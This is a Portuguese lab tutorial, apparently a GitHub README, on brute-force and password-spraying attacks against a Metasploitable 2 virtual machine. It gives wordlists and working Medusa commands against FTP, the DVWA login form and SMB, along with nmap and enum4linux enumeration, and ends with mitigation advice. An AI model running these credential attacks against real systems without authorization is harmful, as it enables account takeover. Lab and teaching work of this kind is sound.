Simulação de Ataques de Força Bruta e Password Spraying com Medusa no Kali LinuxAviso Ético: Este laboratório foi executado exclusivamente em ambiente virtualizado isolado (Host-Only) com máquinas vulneráveis dedicadas para fins educacionais e de auditoria de segurança. Não execute essas técnicas sem autorização expressa.1. Arquitetura do LaboratórioMáquina VirtualPapelRedeIP de ExemploKali LinuxMáquina atacante / auditoria (medusa, nmap, enum4linux, smbclient)Rede Host-Only192.168.56.10Metasploitable 2Alvo vulnerável (FTP, SMB, DVWA)Rede Host-Only192.168.56.20Verificação de Conectividade no Kali LinuxBashping -c 4 192.168.56.20
nmap -sV -p 21,80,139,445 192.168.56.20
2. Estrutura Sugerida do Repositório no GitHubPlaintextataques-forca-bruta-medusa-kali/
├── README.md
├── wordlists/
│   ├── users.txt
│   ├── passwords.txt
│   └── spray_passwords.txt
├── scripts/
│   └── run_lab_checks.sh
└── images/
    ├── 01-nmap-scan.png
    ├── 02-medusa-ftp.png
    ├── 03-medusa-dvwa.png
    └── 04-medusa-smb-spray.png
3. Wordlists Iniciais (wordlists/)wordlists/users.txtPlaintextadmin
msfadmin
user
ftp
guest
test
wordlists/passwords.txtPlaintext123456
password
admin
msfadmin
qwerty
letmein
wordlists/spray_passwords.txtPlaintextSpring2026!
Welcome123
Empresa@2026
msfadmin
4. Cenários Executados com MedusaCenário 1: Ataque de Força Bruta em FTP (Porta 21)Testa combinações de usuários e senhas contra o serviço FTP do Metasploitable 2:Bashmedusa -h 192.168.56.20 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -t 4 -f
Parâmetros principais:-h: IP do alvo.-U / -P: arquivos de usuários e senhas.-M ftp: módulo FTP.-t 4: número de threads simultâneas (ajuste conforme estabilidade do serviço).-f: interrompe a busca para o usuário assim que encontra uma credencial válida.Validação de acesso:Bashftp 192.168.56.20
Cenário 2: Automação de Login em Formulário Web (DVWA)No DVWA (com nível de segurança configurado em Low para fins de teste), identifica-se o caminho do formulário de login (ex.: /dvwa/login.php), os campos username e password no HTML e a string exibida quando o login falha (ex.: Login failed).Bashmedusa \
  -h 192.168.56.20 \
  -U wordlists/users.txt \
  -P wordlists/passwords.txt \
  -M http \
  -m DIR:/dvwa \
  -m FORM:login.php \
  -m DENY-SIGNAL:"Login failed" \
  -t 4 -f
(Nota: se o formulário utilizar POST com parâmetros específicos ou token CSRF, o módulo web-form / parâmetros do Medusa devem ser ajustados conforme a versão do Medusa e o comportamento da aplicação.)Validação de acesso: acessar a interface web do DVWA no navegador e autenticar com a credencial descoberta.Cenário 3: Enumeração e Password Spraying em SMB (Portas 139/445)Em vez de testar dezenas de senhas para uma única conta (o que dispara bloqueios rápidos por tentativa excessiva), o password spraying testa poucas senhas comuns/sazonais em vários usuários:Bash# 1. Enumeração básica de compartilhamentos/informações SMB
enum4linux -a 192.168.56.20

# 2. Password spraying via módulo smbnt do Medusa
medusa \
  -h 192.168.56.20 \
  -U wordlists/users.txt \
  -P wordlists/spray_passwords.txt \
  -M smbnt \
  -t 2
Validação de acesso com smbclient:Bashsmbclient -L //192.168.56.20 -U msfadmin
5. Script Auxiliar (scripts/run_lab_checks.sh)Bash#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-192.168.56.20}"

echo "[*] Verificando conectividade com $TARGET..."
ping -c 2 "$TARGET" >/dev/null

echo "[*] Escaneando portas FTP (21), HTTP (80) e SMB (139, 445)..."
nmap -sV -p 21,80,139,445 "$TARGET"
Torne o script executável com chmod +x scripts/run_lab_checks.sh.6. Limitações do Medusa e Recomendações de MitigaçãoLimitações Observadas na PráticaFormulários web modernos / CSRF / CAPTCHA / SPA: formulários protegidos por tokens anti-CSRF dinâmicos, JavaScript pesado ou CAPTCHA exigem adaptação ou ferramentas especializadas.Bloqueio por taxa / account lockout: serviços configurados com rate limiting ou bloqueio temporário de conta reduzem a eficácia de ataques rápidos e exigem cadência controlada (-t baixo e pausas).Recomendações de MitigaçãoPolítica de senhas fortes e MFA: exigir senhas longas, bloquear senhas comuns/vazadas e habilitar MFA sempre que possível (especialmente em acessos remotos e aplicações web).Bloqueio de conta e Rate Limiting: configurar limites de tentativas falhas com backoff progressivo ou bloqueio temporário (ex.: fail2ban em serviços de rede e rate limit no proxy/aplicação web).Hardening de serviços: desativar protocolos inseguros ou exposições desnecessárias (como FTP em texto claro e compartilhamentos SMB abertos/mal configurados) e restringir acesso por firewall/VLAN.Monitoramento e detecção: gerar alertas para picos de falhas de autenticação (401/403 em logs HTTP, eventos de logon falho em SMB/autenticação) espalhados por múltiplas contas (indicativo de password spraying).
